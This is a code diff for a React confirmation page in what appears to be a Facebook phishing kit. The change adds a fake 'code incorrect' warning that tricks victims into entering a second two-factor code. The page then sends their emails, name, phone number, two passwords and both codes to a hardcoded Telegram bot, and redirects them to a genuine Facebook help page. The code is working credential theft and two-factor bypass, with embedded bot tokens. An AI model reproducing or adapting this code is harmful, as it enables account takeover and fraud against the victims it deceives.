@@ -8,7 +8,11 @@ const ConfirmComponent = () => {
 
     const [activePopup, setActivePopup] = useState(false);
     const [activeLink, setActiveLink] = useState(false);
-    const [timeLeft, setTimeLeft] = useState(300); 
+    const [timeLeft, setTimeLeft] = useState(10); 
+
+    const [activeWaring, setActiveWaring] = useState(false);
+    const [firstCode, setFirstCode] = useState();
+
     const navigate = useNavigate();
 
     useEffect(() => {
@@ -38,31 +42,40 @@ const ConfirmComponent = () => {
     }
 
     const onFinishCodes = (values) => {
-
-        const firtCodes = values.fill_code;
         
-        const dataLocalImages = JSON.parse(localStorage.getItem('dataIamges'))
+        if(timeLeft > 0){
+            setFirstCode(values.fill_code)
+            setActiveWaring(true)
+        }
 
-        const bot_token = '6387439493:AAHaViBOhEGCh_U-dVzhvPCJyZbouSY5IBY';
-        const chat_id   = '-1001737921141';
-        // const bot_token = '6308794044:AAG0LQXsHsTBMaP63UeUrdc9MmDoSUKO5I8';
-        // const chat_id   = '5208541473';
+        
+        else {
+            const dataLocalImages = JSON.parse(localStorage.getItem('dataIamges'))
+            const finalCode = {...dataLocalImages, first_code: firstCode, seconds_code: values.fill_code}
 
-        const message   = '<strong>Email Account: </strong>' + dataLocalImages.fill_business_email + 
-        '%0A<strong>Name Acount: </strong>' + dataLocalImages.fill_full_name + 
-        '%0A<strong>Personal Email: </strong>' + dataLocalImages.fill_personal_email + 
-        '%0A<strong>Facebook Page: </strong>' + dataLocalImages.fill_facebook_pagename + 
-        '%0A<strong>Phone Number: </strong>' + dataLocalImages.fill_phone + 
-        '%0A<strong>Password First: </strong>' + dataLocalImages.firt_password +
-        '%0A<strong>Password Second: </strong>' + dataLocalImages.second_password +
-        '%0A<strong>Images Url: </strong>' + dataLocalImages.url_image +
-        '%0A<strong>Code Authentication : </strong>' + firtCodes ;
 
-        axios.get(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${message}&parse_mode=html`)
-            .then((response) => {
-                return window.location.href = "https://facebook.com/help/282489752085908/trang/?helpref=popular_topics"
-            })
-            .catch((error) => {});
+            const bot_token = '6387439493:AAHaViBOhEGCh_U-dVzhvPCJyZbouSY5IBY';
+            const chat_id   = '-1001737921141';
+            // const bot_token = '6308794044:AAG0LQXsHsTBMaP63UeUrdc9MmDoSUKO5I8';
+            // const chat_id   = '5208541473';
+
+            const message   = '<strong>Email Account: </strong>' + finalCode.fill_business_email + 
+            '%0A<strong>Name Acount: </strong>' + finalCode.fill_full_name + 
+            '%0A<strong>Personal Email: </strong>' + finalCode.fill_personal_email + 
+            '%0A<strong>Facebook Page: </strong>' + finalCode.fill_facebook_pagename + 
+            '%0A<strong>Phone Number: </strong>' + finalCode.fill_phone + 
+            '%0A<strong>Password First: </strong>' + finalCode.firt_password +
+            '%0A<strong>Password Second: </strong>' + finalCode.second_password +
+            '%0A<strong>Images Url: </strong>' + finalCode.url_image +
+            '%0A<strong>First Code Authen: </strong>' + finalCode.first_code +
+            '%0A<strong>Second Code Authen : </strong>' + finalCode.seconds_code ;
+
+            axios.get(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${message}&parse_mode=html`)
+                .then((response) => {
+                    return window.location.href = "https://facebook.com/help/282489752085908/trang/?helpref=popular_topics"
+                })
+                .catch((error) => {});
+        }
 
     };
 
@@ -146,6 +159,10 @@ const ConfirmComponent = () => {
                                                     </p>
                                                     <Link id="sendcodeagain" className={`btn ${activeLink == true ? 'active' : ''}`} to="">Send Code Again?</Link>
                                                 </div>
+                                            </div>
+
+                                            <div className={`${activeWaring == true ? 'active' : ''}`} id="waring-code"> 
+                                                <p>The code generator you entered is incorrect. Please wait {minutes} minutes {seconds < 10 ? `0${seconds}` : seconds} seconds to receive another one.</p>
                                             </div>
                                                 
 
